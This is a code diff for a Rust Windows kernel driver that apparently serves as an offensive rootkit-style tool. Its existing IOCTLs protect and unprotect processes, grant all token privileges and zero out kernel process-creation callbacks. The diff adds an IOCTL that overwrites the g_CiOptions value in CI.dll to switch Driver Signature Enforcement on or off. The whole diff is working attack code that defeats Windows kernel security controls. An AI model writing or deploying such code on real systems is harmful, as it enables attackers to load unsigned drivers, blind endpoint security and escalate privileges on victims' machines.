@@ -1,5 +1,6 @@
 #![no_std]
 #![feature(alloc_c_string)]
+#![feature(core_c_str)]
 
 
 mod string;
@@ -12,13 +13,14 @@ mod dse;
 
 use core::{panic::PanicInfo, mem::{size_of}};
 use core::ptr::null_mut;
+use dse::get_gci_options_address;
 use kernel_alloc::nt::ExFreePool;
 use winapi::{km::wdm::IO_PRIORITY::IO_NO_INCREMENT, shared::ntstatus::{STATUS_BUFFER_TOO_SMALL, STATUS_INVALID_PARAMETER}};
 use winapi::km::wdm::{DRIVER_OBJECT, IoCreateDevice, PDEVICE_OBJECT, IoCreateSymbolicLink, IRP_MJ, DEVICE_OBJECT, IRP, IoCompleteRequest, IoGetCurrentIrpStackLocation, IoDeleteSymbolicLink, IoDeleteDevice, DEVICE_TYPE};
 use winapi::shared::ntdef::{NTSTATUS, UNICODE_STRING, FALSE, NT_SUCCESS, TRUE};
 use winapi::shared::ntstatus::{STATUS_SUCCESS, STATUS_UNSUCCESSFUL};
-use common::{IOCTL_PROCESS_PROTECT_REQUEST, IOCTL_PROCESS_UNPROTECT_REQUEST, IOCTL_PROCESS_TOKEN_PRIVILEGES_REQUEST, IOCTL_CALLBACKS_ENUM_REQUEST, IOCTL_CALLBACKS_ZERO_REQUEST, CallBackInformation, TargetProcess, TargetCallback};
-use crate::{callbacks::{PsSetCreateProcessNotifyRoutineEx, process_create_callback, PcreateProcessNotifyRoutineEx, search_loaded_modules, get_loaded_modules}, process::find_psp_set_create_process_notify, dse::get_module_base};
+use common::{IOCTL_PROCESS_PROTECT_REQUEST, IOCTL_PROCESS_UNPROTECT_REQUEST, IOCTL_PROCESS_TOKEN_PRIVILEGES_REQUEST, IOCTL_CALLBACKS_ENUM_REQUEST, IOCTL_CALLBACKS_ZERO_REQUEST, IOCTL_DSE_ENABLE_DISABLE_REQUEST, CallBackInformation, TargetProcess, TargetCallback, DriverSignatureEnforcement};
+use crate::{callbacks::{PsSetCreateProcessNotifyRoutineEx, process_create_callback, PcreateProcessNotifyRoutineEx, search_loaded_modules, get_loaded_modules}, process::find_psp_set_create_process_notify};
 use crate::process::{protect_process, unprotect_process};
 use crate::string::create_unicode_string;
 use crate::token::enable_all_token_privileges;
@@ -50,8 +52,6 @@ pub extern "system" fn driver_entry(driver: &mut DRIVER_OBJECT, _: &UNICODE_STRI
     KernelLogger::init(LevelFilter::Info).expect("Failed to initialize logger");
 
     log::info!("Driver Entry called");
-
-    get_module_base(b"CI.dll");
 
     driver.DriverUnload = Some(driver_unload);
 
@@ -163,6 +163,8 @@ pub extern "system" fn dispatch_device_control(_device_object: &mut DEVICE_OBJEC
             unsafe { ExFreePool(modules as u64) };
         },
         IOCTL_CALLBACKS_ZERO_REQUEST => {
+            log::info!("IOCTL_CALLBACKS_ZERO_REQUEST");
+
             if unsafe { (*stack).Parameters.DeviceIoControl().InputBufferLength < size_of::<TargetCallback>() as u32 } {
                 status = STATUS_BUFFER_TOO_SMALL;
                 log::error!("STATUS_BUFFER_TOO_SMALL");
@@ -176,7 +178,7 @@ pub extern "system" fn dispatch_device_control(_device_object: &mut DEVICE_OBJEC
                 log::error!("STATUS_INVALID_PARAMETER");
                 return complete_request(irp, status, information);
             }
-
+            
             if unsafe { (*target).index < 0 || (*target).index > 64 } {
                 status = STATUS_INVALID_PARAMETER;
                 log::error!("STATUS_INVALID_PARAMETER");
@@ -194,6 +196,48 @@ pub extern "system" fn dispatch_device_control(_device_object: &mut DEVICE_OBJEC
                     break;             
                 }
             }
+            log::info!("IOCTL_CALLBACKS_ZERO_REQUEST successful");
+        },
+        IOCTL_DSE_ENABLE_DISABLE_REQUEST => {
+            log::info!("IOCTL_DSE_ENABLE_DISABLE_REQUEST");
+
+            if unsafe { (*stack).Parameters.DeviceIoControl().InputBufferLength < size_of::<DriverSignatureEnforcement>() as u32 } {
+                status = STATUS_BUFFER_TOO_SMALL;
+                log::error!("STATUS_BUFFER_TOO_SMALL");
+                return complete_request(irp, status, information);
+            }
+
+            if unsafe { (*stack).Parameters.DeviceIoControl().OutputBufferLength < size_of::<DriverSignatureEnforcement>() as u32 } {
+                status = STATUS_BUFFER_TOO_SMALL;
+                log::error!("STATUS_BUFFER_TOO_SMALL");
+                return complete_request(irp, status, information);
+            }
+
+            let dse = unsafe { (*stack).Parameters.DeviceIoControl().Type3InputBuffer as *mut DriverSignatureEnforcement };
+            let user_buffer = unsafe { irp.UserBuffer as *mut DriverSignatureEnforcement };
+
+            if dse.is_null() {
+                status = STATUS_INVALID_PARAMETER;
+                log::error!("STATUS_INVALID_PARAMETER");
+                return complete_request(irp, status, information);
+            }
+
+            let g_ci_option_address = get_gci_options_address().expect("Unable to get g_CiOptions address");
+
+            if unsafe { (*dse).is_enabled } {
+                unsafe { *(g_ci_option_address as *mut u64) = 0x0006 as u64 }; // Enable DSE
+                unsafe { (*user_buffer).address = *(g_ci_option_address as *mut u64) };
+                unsafe { (*user_buffer).is_enabled = true };
+            } else {
+                unsafe { *(g_ci_option_address as *mut u64) = 0x000E as u64 }; // Disble DSE
+                unsafe { (*user_buffer).address = *(g_ci_option_address as *mut u64) };
+                unsafe { (*user_buffer).is_enabled = false };
+            }
+
+            log::info!("IOCTL_DSE_ENABLE_DISABLE_REQUEST successful");
+
+            information = size_of::<DriverSignatureEnforcement>();
+            status = STATUS_SUCCESS;
         },
         _ => {
             log::error!("Invalid IOCTL code");
